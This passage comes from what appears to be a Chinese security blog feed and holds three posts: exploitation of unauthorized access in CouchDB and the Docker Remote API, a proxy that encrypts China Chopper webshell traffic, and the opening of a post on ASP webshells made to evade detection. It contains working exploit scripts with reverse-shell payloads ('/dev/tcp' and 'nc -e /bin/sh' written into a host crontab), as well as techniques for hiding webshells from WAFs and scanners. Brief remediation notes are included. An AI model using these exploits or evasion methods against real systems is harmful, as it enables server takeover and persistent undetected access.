<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@your-ip:5984&#x2F;vultest&#x2F;_design&#x2F;vul -d &#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure>

<p>增加_view的同时即触发了query_servers中的命令。</p>
<p><strong>2.1 p牛的python脚本 支持高低版本,需要在version = 定义</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import requests</span><br><span class="line">from requests.auth import HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:5984&#39;</span><br><span class="line">command &#x3D; &#39;&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.2.64&#x2F;2222 0&gt;&amp;1&quot;&#39;</span><br><span class="line">version &#x3D; 2</span><br><span class="line"></span><br><span class="line">session &#x3D; requests.session()</span><br><span class="line">session.headers &#x3D; &#123;</span><br><span class="line">    &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;</span><br><span class="line">&#125;</span><br><span class="line">## session.proxies &#x3D; &#123;</span><br><span class="line">##     &#39;http&#39;: &#39;http:&#x2F;&#x2F;127.0.0.1:8085&#39;</span><br><span class="line">## &#125;</span><br><span class="line">session.put(target + &#39;&#x2F;_users&#x2F;org.couchdb.user:wooyun&#39;, data&#x3D;&#39;&#39;&#39;&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;wooyun&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;wooyun&quot;</span><br><span class="line">&#125;&#39;&#39;&#39;)</span><br><span class="line"></span><br><span class="line">session.auth &#x3D; HTTPBasicAuth(&#39;wooyun&#39;, &#39;wooyun&#39;)</span><br><span class="line"></span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.put(target + (&#39;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;), data&#x3D;command)</span><br><span class="line">else:</span><br><span class="line">    host &#x3D; session.get(target + &#39;&#x2F;_membership&#39;).json()[&#39;all_nodes&#39;][0]</span><br><span class="line">    session.put(target + &#39;&#x2F;_node&#x2F;&#123;&#125;&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39;.format(host), data&#x3D;command)</span><br><span class="line"></span><br><span class="line">session.put(target + &#39;&#x2F;wooyun&#39;)</span><br><span class="line">session.put(target + &#39;&#x2F;wooyun&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;: &quot;wooyuntest&quot;&#125;&#39;)</span><br><span class="line"></span><br><span class="line">if version &#x3D;&#x3D; 1:</span><br><span class="line">    session.post(target + &#39;&#x2F;wooyun&#x2F;_temp_view?limit&#x3D;10&#39;, data&#x3D;&#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39;)</span><br><span class="line">else:</span><br><span class="line">    session.put(target + &#39;&#x2F;wooyun&#x2F;_design&#x2F;test&#39;, data&#x3D;&#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;,&quot;views&quot;:&#123;&quot;wooyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot;language&quot;:&quot;cmd&quot;&#125;&#39;)</span><br></pre></td></tr></table></figure>

<p><strong>2.2 bash自动化脚本</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">echo CouchDB getshell - c0debreak - tools.changesec.com</span><br><span class="line">echo</span><br><span class="line"></span><br><span class="line">if [[ $## -ne 2 ]];then</span><br><span class="line">    echo Usage: $0 http:&#x2F;&#x2F;xx.xx.xx.xx:5984 myserver:myport</span><br><span class="line">    exit 1</span><br><span class="line">else</span><br><span class="line">    server&#x3D;$1</span><br><span class="line">    cb&#x3D;$&#123;2&#x2F;:&#x2F;\&#x2F;&#125;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">function run() &#123;</span><br><span class="line">    cmd&#x3D;$1</span><br><span class="line"></span><br><span class="line">    curl -XPUT &quot;$server&#x2F;_config&#x2F;query_servers&#x2F;cmd&quot; -d &quot;\&quot;$cmd\&quot;&quot;</span><br><span class="line">    curl -XPUT &quot;$server&#x2F;example&quot;</span><br><span class="line">    curl -XPUT &quot;$server&#x2F;example&#x2F;record&quot; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">    curl --max-time 1 &quot;$server&#x2F;example&#x2F;_temp_view?limit&#x3D;1&quot; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;, &quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run &quot;echo &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;$cb 0&gt;&amp;1&#39; &gt; &#x2F;tmp&#x2F;shell&quot;</span><br><span class="line">run &quot;bash &#x2F;tmp&#x2F;shell&quot;</span><br><span class="line">run &quot;rm -f &#x2F;tmp&#x2F;shell&quot;</span><br><span class="line"></span><br><span class="line">curl -XDELETE &quot;$server&#x2F;_config&#x2F;query_servers&#x2F;cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7wr6bjwj31q40u0npe.jpg" alt="img"></p>
<h4 id="3-漏洞修复-1"><a href="#3-漏洞修复-1" class="headerlink" title="3. 漏洞修复"></a>3. 漏洞修复</h4><p><em>1、指定CouchDB绑定的IP</em> （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 <code>bind_address = 0.0.0.0</code>，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</p>
<p><em>2、设置访问密码</em> （需要重启CouchDB才能生效） 在 <code>/etc/couchdb/local.ini</code>中找到<code>[admins]</code>字段配置密码。</p>
<h2 id="0x09-Docker未授权访问"><a href="#0x09-Docker未授权访问" class="headerlink" title="0x09 Docker未授权访问"></a>0x09 Docker未授权访问</h2><h4 id="1-基础介绍"><a href="#1-基础介绍" class="headerlink" title="1. 基础介绍"></a>1. 基础介绍</h4><p>[<a href="http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8]" target="_blank" rel="noopener">http://www.loner.fm/drops/##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8]</a>(<a href="http://www.loner.fm/drops/##!/drops/1203.新姿势之Docker" target="_blank" rel="noopener">http://www.loner.fm/drops/##!/drops/1203.新姿势之Docker</a> Remote API未授权访问漏洞分析和利用)</p>
<p>docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。</p>
<p>漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 <a href="http://host:2375/containers/json" target="_blank" rel="noopener">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。</p>
<p>然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。</p>
<h4 id="2-测试环境配置"><a href="#2-测试环境配置" class="headerlink" title="2. 测试环境配置"></a>2. 测试环境配置</h4><p>先关闭docker，然后开启：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo service docker stop</span><br><span class="line">sudo docker daemon  -H tcp:&#x2F;&#x2F;0.0.0.0:2375 -H unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock</span><br></pre></td></tr></table></figure>

<p>绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。</p>
<p>参考API规范进行渗透：<a href="https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/</a></p>
<p>操作Docker API可以使用python dockert api 完成。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install docker-py</span><br></pre></td></tr></table></figure>

<p>API使用参考：<a href="https://docker-py.readthedocs.io/en/stable/api/##client-api" target="_blank" rel="noopener">https://docker-py.readthedocs.io/en/stable/api/##client-api</a></p>
<h4 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h4><p><strong>3.1 From:phith0n</strong><br>利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import docker</span><br><span class="line"></span><br><span class="line">client &#x3D; docker.DockerClient(base_url&#x3D;&#39;http:&#x2F;&#x2F;your-ip:2375&#x2F;&#39;)</span><br><span class="line">data &#x3D; client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * &#x2F;usr&#x2F;bin&#x2F;nc your-ip 21 -e &#x2F;bin&#x2F;sh&#39; &gt;&gt; &#x2F;tmp&#x2F;etc&#x2F;crontabs&#x2F;root&quot; &#39;&#39;&#39;, remove&#x3D;True, volumes&#x3D;&#123;&#39;&#x2F;etc&#39;: &#123;&#39;bind&#39;: &#39;&#x2F;tmp&#x2F;etc&#39;, &#39;mode&#39;: &#39;rw&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p>写入crontab文件，成功反弹shell：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggx7yk1kmej31k60cwtan.jpg" alt="img"></p>
<p><strong>3.2 python脚本</strong><br><a href="https://github.com/Tycx2ry/docker_api_vul" target="_blank" rel="noopener">https://github.com/Tycx2ry/docker_api_vul</a></p>
<ul>
<li>安装类库<br>pip install -r requirements.txt</li>
<li>查看运行的容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375</li>
<li>查看所有的容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a</li>
<li>查看所有镜像<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l</li>
<li>查看端口映射<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L</li>
<li>写计划任务（centos,redhat等,加-u参数用于ubuntu等）<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口</li>
<li>写sshkey(自行修改脚本的中公钥)<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k</li>
<li>在容器中执行命令<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e <code>&quot;id&quot;</code> -I 容器id</li>
<li>删除容器<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id</li>
<li>修改client api版本<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22</li>
<li>查看服务端api版本<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V</li>
</ul>
<p><strong>3.3 其他的一些exp</strong><br><a href="https://github.com/netxfly/docker-remote-api-exp" target="_blank" rel="noopener">https://github.com/netxfly/docker-remote-api-exp</a><br><a href="https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API未授权访问漏洞.py" target="_blank" rel="noopener">https://github.com/zer0yu/SomePoC/blob/master/Docker/Docker_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.py</a><br><a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker安全" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8</a></p>
<h4 id="4-防护策略"><a href="#4-防护策略" class="headerlink" title="4. 防护策略"></a>4. 防护策略</h4><p><em>1.修改 Docker Remote API 服务默认参数。</em>注意：该操作需要重启 Docker 服务才能生效。</p>
<p><em>2.修改 Docker 的启动参数：</em><br>定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1<br>或将默认端口 2375 改为自定义端口<br>为 Remote API 设置认证措施。参照 官方文档 配置 Remote API 的认证措施。</p>
<p><em>3.注意：该操作需要重启 Docker 服务才能生效。</em><br>修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。</p>
<p><em>4.注意：该操作需要重启 Docker 服务才能生效。</em><br>设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。</p>
<h4 id="from-先知社区"><a href="#from-先知社区" class="headerlink" title="from 先知社区"></a>from 先知社区</h4><p><a href="https://xz.aliyun.com/t/2320" target="_blank" rel="noopener">https://xz.aliyun.com/t/2320</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>编码混淆wehshell</title>
    <url>/2020/08/04/china-chopper/</url>
    <content><![CDATA[<h3 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h3><p>  在实际的渗透测试中，Webshell真正免杀的第一步就是确保 Webshell 的源脚本免杀，其次是传输内容的编码混淆。</p>
<p>  但仅将 request 包内容进行编码，发送到服务器是远远不够的；部分 WAF 或者信息防泄漏系统还会对网页的 response 返回包流量进行检测。这时候，无论源脚本的免杀构造多精巧，request 包编码的多复杂，response 返回的明文内容都会暴露它是一个彻底的 Webshell 脚本。</p>
<p>  目前网络上一些公开客户端，通常仅支持 request 包的自定义编码功能，服务器的代码执行 response 结果通常是明文状态，且无法定义方法进行服务端 response 内容的编码，并最后解码后展示执行结果。</p>
<p>  本篇文章主要分享自己为解决以上问题，根据 caidao.exe，编写普适的本地代理脚本—CaiDaoProxy.py，绕过WAF和流量检测软件对一句话 Webshell 检测的相关思路。</p>
<h3 id="0x01：原因"><a href="#0x01：原因" class="headerlink" title="0x01：原因"></a>0x01：原因</h3><p>  使用 caidao.exe (20160620 版 <strong>MD5: AC86066FFD58779F4C0DB5030574B0CB</strong>) 进行 CaiDaoProxy.py 的开发大致有以下几个原因：</p>
<ul>
<li>20160620 版本后的 caidao.exe 拥有配置文件，可以直接修改配置文件中发往服务器的语句</li>
<li>中间人 Proxy 拦截修改模式对流量的可操作性较强，可随意修改发送包和响应包的任意内容</li>
</ul>
<ul>
<li>避免为解决中间流量编码混淆等问题重复造轮子，制作 “新型菜刀” 客户端</li>
<li>表面用的是普通的 caidao.exe，其实用的是过WAF版的CaiDaoProxy，还是有点意思的</li>
</ul>
<h3 id="0x02：原理"><a href="#0x02：原理" class="headerlink" title="0x02：原理"></a>0x02：原理</h3><p>  一言以蔽之：CaiDaoProxy.py 是一个中间人HTTP流量代理脚本。</p>
<p>  它可以在 caidao.exe 发送给目标的 request 内容、目标返回给 caidao.exe 的 response 内容上进行修改，以完成在仅修改菜刀配置文件 caidao.conf 的基础上，结合特定的 Webshell 完成目标到 caidao.exe 之间的流量编码混淆，达到躲过 webshell 流量检测的目的。</p>
<p>  配合基础的免杀源文件，将躲过大部分 Webshell 检测软件和监测平台的 Webshell 发现手段。其实现原理主要如下图所示： </p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetlyc8n0j30fo096my0.jpg" alt="CaiDaoProxy"></p>
<p>  可以发现，发送到服务端 <a href="http://www.example.com" target="_blank" rel="noopener">www.example.com</a> 的请求是编码混淆过的，服务端的响应也是编码混淆过的。</p>
<p>  对于一些 WAF 和主机流量防护软件来说，原来的caidao 请求特征值<strong>“z0”</strong>、<strong>“z1”</strong>、<strong>“z2”</strong>，分隔符 “<strong>X@Y</strong>“及其它敏感内容(物理路径、执行命令结果等)都无法轻易检测到了。</p>
<h3 id="0x03：源文件免杀"><a href="#0x03：源文件免杀" class="headerlink" title="0x03：源文件免杀"></a>0x03：源文件免杀</h3><p>  前言中讲了，在有文件的 Webshell 中，源文件免杀是第一步。源文件免杀的php、asp一句话脚本参考我以前写的 <a href="https://github.com/LandGrey/webshell-detect-bypass" target="_blank" rel="noopener">文章</a> 构造起来不算困难。</p>
<p>  但一句话形式的(实际文本内容比较多) JSP Webshell 网络公开讲绕过检测的比较少，所以分享一个比较简单的 JSP Webshell免杀方法—<strong>unicode编码</strong>。</p>
<p>  <a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/CaiDao-Webshell-Password-LandGrey.jsp" target="_blank" rel="noopener">这里</a> 提供一个 caidao.exe 20160620 及以后版本 (默认分隔符: <strong>X@Y</strong>) 可正常连接，源文件免杀的 jsp 一句话示例脚本，密码: <code>LandGrey</code></p>
<p>  原理是 Java 编译器可将 unicode 编码的 java 源代码 (下图所示的 jsp 中的 “<strong>\uxxxx</strong>“ 形式的 unicode 编码后的代码) 正常编译成 class文件。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetm0ornrj30kf086t8x.jpg" alt=""></p>
<p>  将提供的 Webshell 放在服务器上，访问后打开 Tomcat 的 work 编译目录，可发现反编译后依然正常的 class 文件和 unicode 编码的 java 源代码文件。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetm36lf0j30l80fsdhb.jpg" alt=""></p>
<h3 id="0x04：传输内容加密"><a href="#0x04：传输内容加密" class="headerlink" title="0x04：传输内容加密"></a>0x04：传输内容加密</h3><p>  这里的<strong>传输内容加密</strong>是指：</p>
<blockquote>
<p>以服务器的角度来看：客户端发送给它的 request 包中的 POST 参数名和参数值无法轻易知晓其含义；</p>
<p>并且服务器返回给客户端的 response 包中的内容也无法轻易知晓其含义。</p>
</blockquote>
<p>  随着攻防对抗的升级，现在的 Webshell 客户端都有较为原始的”传输内容加密”策略，比如 caidao.exe 默认将发送的部分内容进行一次 base64 编码、16进制转码等，但现在默认的这些小 trick，在躲避检测上起到的作用越来越小，一些防护软件会尝试简单的编码，还原成明文的内容，然后再检测传输内容是否异常。</p>
<p>  限于篇幅，php 、asp等脚本的 CaiDaoProxy.py 实现只介绍其思路，重点说明 jsp 一句话 Webshell 流量加密的 CaiDaoProxy.py 实现方法。</p>
<p>  CaiDaoProxy 的 HTTP 代理功能可使用 Python 的 BaseHTTPServer 基础库完成，默认监听本地一个端口，比如 9000；然后 caidao.exe 地址栏填入 <code>http://127.0.0.1:9000/?=http://www.example.com/webshell.jsp</code>，真正请求地址由 CaiDaoProxy 剥离出来即可。</p>
<ul>
<li>对于常见的 php、asp、aspx等一句话 webshell 来说：</li>
</ul>
<ol>
<li>可在 caidao.exe 向服务端发送 request 包时，用CaiDaoProxy.py 拦截请求，随机化参数名并组合两种及以上不同的简单编码(如php的 <strong>base64_encode -&gt; strrev-&gt; base64_encode</strong>)，编码参数值来混淆请求流量，然后再发给服务端; </li>
<li>服务端 Webshell 根据编码方式，解码请求值，并在服务端执行；</li>
<li>可更改 caidao.conf 文件或者在 CaiDaoProxy.py 脚本中统一修改发往服务端执行的代码，将服务端执行的内容输出 <code>print</code> 或者 <code>echo</code>值进行相应编码；</li>
<li>CaiDaoProxy.py 脚本拦截到编码后的服务端输出，根据编码方法，统一解码后返回给 caidao.exe 即可。</li>
</ol>
<ul>
<li>对于 jsp 一句话 Webshell 来说：主要逻辑都在服务端的 jsp 脚本中，所以我们可以选择基础的对称加密算法 DES 来加密通信流量。然后可约定加解密方法：</li>
</ul>
<ol>
<li>CaiDaoProxy 发送请求前，进行 <strong>DES加密 -&gt; Base64编码</strong></li>
<li>服务端接收请求后，进行 <strong>Base64解码 -&gt; DES解密</strong></li>
<li>服务端输出响应结果时，进行 <strong>DES加密 -&gt; Base64编码</strong></li>
<li>CaiDaoProxy 接收响应后，进行 <strong>Base64解码 -&gt; DES解密</strong></li>
</ol>
<p><strong>服务端关键加解密代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKey;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.DESKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.SecretKeyFactory;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥</span></span><br><span class="line">String DesKey = <span class="string">"LandGrey"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DES 加密函数</span></span><br><span class="line"><span class="keyword">byte</span>[] DesEncrpyt(String content) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    SecureRandom random = <span class="keyword">new</span> SecureRandom();</span><br><span class="line">    DESKeySpec desKey = <span class="keyword">new</span> DESKeySpec(DesKey.getBytes());</span><br><span class="line">    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    SecretKey securekey = keyFactory.generateSecret(desKey);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    cipher.init(Cipher.ENCRYPT_MODE, securekey, random);</span><br><span class="line">    <span class="keyword">return</span> cipher.doFinal(content.getBytes());</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DES 解密函数</span></span><br><span class="line"><span class="keyword">byte</span>[] DesDecrpyt(<span class="keyword">byte</span>[] content) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    SecureRandom random = <span class="keyword">new</span> SecureRandom();</span><br><span class="line">    DESKeySpec desKey = <span class="keyword">new</span> DESKeySpec(DesKey.getBytes());</span><br><span class="line">    SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    SecretKey securekey = keyFactory.generateSecret(desKey);</span><br><span class="line">    Cipher cipher = Cipher.getInstance(<span class="string">"DES"</span>);</span><br><span class="line">    cipher.init(Cipher.DECRYPT_MODE, securekey, random);</span><br><span class="line">    <span class="keyword">return</span> cipher.doFinal(content);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>CaiDaoProxy 关键加解密代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> des, ECB, PAD_PKCS5</span><br><span class="line"></span><br><span class="line">// 密钥</span><br><span class="line">DesKey = <span class="string">"LandGrey"</span></span><br><span class="line"></span><br><span class="line">// DES加解密类</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesCipher</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, secret_key)</span>:</span></span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        iv = self.secret_key</span><br><span class="line">        k = des(self.secret_key, ECB, iv, pad=<span class="literal">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">        en = k.encrypt(bytes(s), padmode=PAD_PKCS5)</span><br><span class="line">        <span class="keyword">return</span> en</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        iv = self.secret_key</span><br><span class="line">        k = des(self.secret_key, ECB, iv, pad=<span class="literal">None</span>, padmode=PAD_PKCS5)</span><br><span class="line">        de = k.decrypt(s, padmode=PAD_PKCS5)</span><br><span class="line">        <span class="keyword">return</span> de</span><br></pre></td></tr></table></figure>

<p>  然后，就可以参考本文 *<em>0x03：源文件免杀 *</em>的思路，将新的支持流量加解密的 jsp 一句话 Webshell 进行 unicode 编码，一个简单的源文件免杀和通信流量加密的 JSP 一句话 Webshell 就制作完成了。</p>
<p>  CaiDaoProxy.py 使用效果图：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ghetm9bvvjg30pj0jhwmn.gif" alt=""></p>
<h3 id="0x05：后记"><a href="#0x05：后记" class="headerlink" title="0x05：后记"></a>0x05：后记</h3><p>  在编写通用的有文件一句话 Webshell HTTP 代理 CaiDaoProxy 过程中，相当自己又梳理了一遍 caidao.exe 工具的基本原理，对后面更高级的 Webshell Detect Bypass 技术的学习大有裨益。</p>
<p>  虽然这种源脚本和流量都免杀的一句话已经适应较多绕过检测的场景，但当防护软件有进程监控、组件监控或 RASP 功能时，如果使用 caidao.exe 的虚拟终端功能，有极大概率会被检测出来，这也是目前一个比较重要，且需要考虑的 Webshell Bypass 问题。</p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>asp马-bypass</title>
    <url>/2020/08/04/asp-webshell-bypass/</url>
    <content><![CDATA[<h3 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h3><p>随着时间的推移和其它新型动态网页技术的兴起，使用ASP(Active Server Page)技术构建的Web应用越来越少。ASP的衰落、旧资料和链接的失效、前辈们早期对ASP较多的研究，都导致了新型ASP网站后门和技术研究的减少。</p>
<p>本篇文章主要梳理ASP一句话Webshell的构建和规避检测软件达到源文件免杀的思路。最终构建能够同时绕过以下表格中8个专业木马查杀工具和平台检测的Webshell，构造出零提示、无警告、无法被检测到的ASP一句话木马后门。</p>
<table>
<thead>
<tr>
<th>编号</th>
<th>名称</th>
<th>参考链接</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>网站<strong>安全狗</strong>(IIS 4.0)</td>
<td><a href="http://download.safedog.cn/download/software/safedogIISV4.0.exe" target="_blank" rel="noopener">http://download.safedog.cn/download/software/safedogIISV4.0.exe</a></td>
</tr>
<tr>
<td>2</td>
<td><strong>D盾Web查杀</strong> V2.0.9</td>
<td><a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></td>
</tr>
<tr>
<td>3</td>
<td><strong>D盾防火墙</strong> v2.0.6.92</td>
<td><a href="http://www.d99net.net/down/d_safe_2.0.6.92.zip" target="_blank" rel="noopener">http://www.d99net.net/down/d_safe_2.0.6.92.zip</a></td>
</tr>
<tr>
<td>4</td>
<td><strong>深信服</strong>WebShellKillerTool(2017)</td>
<td><a href="http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip" target="_blank" rel="noopener">http://edr.sangfor.com.cn/tool/WebShellKillerTool.zip</a></td>
</tr>
<tr>
<td>5</td>
<td><strong>360主机卫士</strong>v2.0.5.9</td>
<td><a href="http://down-www.newasp.net/pcdown/soft/dys/360WebSafe_Setup.rar" target="_blank" rel="noopener">http://down-www.newasp.net/pcdown/soft/dys/360WebSafe_Setup.rar</a></td>
</tr>
<tr>
<td>6</td>
<td><strong>护卫神</strong>云查杀系统(V4.5)</td>
<td><a href="http://down.huweishen.com/free/HwsKill.zip" target="_blank" rel="noopener">http://down.huweishen.com/free/HwsKill.zip</a></td>
</tr>
<tr>
<td>7</td>
<td><strong>OpenRASP</strong> WEBDIR+ Webshell检测</td>
<td><a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a></td>
</tr>
<tr>
<td>8</td>
<td><strong>河马专业版</strong>查杀Webshell</td>
<td><a href="http://n.shellpub.com/" target="_blank" rel="noopener">http://n.shellpub.com/</a></td>
</tr>
</tbody></table>
